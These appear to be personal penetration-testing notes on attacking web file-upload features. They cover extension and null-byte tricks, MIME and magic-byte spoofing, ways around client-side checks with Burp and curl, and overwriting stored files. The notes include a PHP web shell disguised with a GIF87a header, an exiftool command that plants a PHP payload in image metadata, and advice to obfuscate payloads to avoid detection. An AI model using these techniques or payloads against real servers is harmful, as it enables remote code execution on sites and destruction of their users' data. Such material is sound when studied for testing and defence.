File uploads attacks
try different extensions like .pHp,.php5,.phtml etc there are diffferent extensions for single technology

If server is using php version 5 or less then we can bypass extension check simply by appending null byte with the .php extension
Overwriting existing files

If we know that image with a name is being stored for example in images/example.jpg then we can try to upload file of our own choice with same name and upload it.If its vulnerable than our image will replace the old one .This leads to data loss of customers
File type validation
Mime bypass

 mime-type shows us content type inside a file regardless of its extension,we can change this and trick the server

 we can check a file content type by following

    file --mime-type filname.extension

 sometimes try changing the content type in burp because servers verify sometimes from there

 for example we can change the application/x-php to image/jpeg if server accepts images etc

Tampering Magic Bytes

we can change header bytes of a file which will make it look like a filetype of entered magic bytes.

we can find most useful file headers here

    https://en.wikipedia.org/wiki/List_of_file_signatures If a jpg file is allowed and extension changing is not successful ,then we can add jpg magic bytes at the start of our malicious file which will make the file behave as jpg

For example we have a exploit.php with contents

<?php
passthru("/bin/bash");
?>

Server will detect this as a php file because of its header. We can add magic byte of jpg ÿØÿî or of gif GIF87a. So the code becomes

GIF87a;
<?php
passthru("/bin/bash");
?>

Tips:
Always try jpg,jpeg,png,gif headers as they are likely to bypass

File Length Filtering
Sometimes Server places a filter which checks the size of our uploaded file so we need to look out for those too
File Name Filtering

Servers sometimes rename our uploaded file and sanitise its name to remove bad characters etc. So if we cant find our file with the name uploaded then this filter is likely in place. Usually its named after the date and a sequence number so it may be possible to fuzz it
Client side Bypass

There are four easy ways to bypass your average client-side file upload filter:
1- Turn off Javascript in your browser -- this will work provided the site doesn't require Javascript in order to provide basic functionality. If turning off Javascript completely will prevent the site    from working at all then one of the other methods would be more desirable; otherwise, this can be an effective way of completely bypassing the client-side filter.
2- Intercept and modify the incoming page. Using Burpsuite, we can intercept the incoming web page and strip out the Javascript filter before it has a chance to run.
3- Intercept and modify the file upload. Where the previous method works before the webpage is loaded, this method allows the web page to load as normal, but intercepts the file upload after it's already passed (and been accepted by the filter). 
4 -Send the file directly to the upload point. Why use the webpage with the filter, when you can send the file directly using a tool like curl? Posting the data directly to the page which contains the code for handling the file upload is another effective method for completely bypassing a client side filter. We will not be covering this method in any real depth in this tutorial, however, the syntax for such a command would look something like this: curl -X POST -F "submit:<value>" -F "<file-parameter>:@<path-to-file>" <site>. To use this method you would first aim to intercept a successful upload (using Burpsuite or the browser console) to see the parameters being used in the upload, which can then be slotted into the above command.

The below method is good for bypassing client side. We just load our website through burpsuite to strip js files fucntions which validates check and then no js file is loaded and we can upload files

Lets suppose theres a client side filter in place.When we intercept the request we can intercept the javascript or client side filter from loading and change its code functionality then forward it and the file check doesnt take place It's worth noting here that Burpsuite will not, by default, intercept any external Javascript files that the web page is loading. If you need to edit a script which is not inside the main page being loaded, you'll need to go to the "Options" tab at the top of the Burpsuite window, then under the "Intercept Client Requests" section, edit the condition of the first line to remove ^js$|

                                                                 OR

We can also upload our webshell with the extension and mime type of allowed extension so client side let us bypass and then intercept with burp and change types back to php or whatever desired. This way we get our original desired file

Try both above methods
Server Side extension bypass

Try different extensions for e.g for php we can use php2,phtml,phar etc

Lets suppose only jpg images are allowed. We can try to bypass the filter by naming our file shell.jpg.php.Its worth a try and sserver sees jpg and let us upload it.
uploading using curl (from cli)

    curl -F 'image=@test.jpg;type=image/jpeg' 10.0.30.187/upload.php

Hidiing malcious code in an image

We can upload malicious code in legit image by inserting our payload in exifdata. Exif comment is best place to write to

    exiftool -Comment="Test Payload\"; die(); ?>" test-USERNAME.jpeg.php

We can use above example to test if our payload gets execueted or not.PHP code is not a must and we can write any payload here according to the webapp we are attacking. In real cases we need to obfuscate our code and then add that obfuscated malicous payload in exifdata to avoid detection

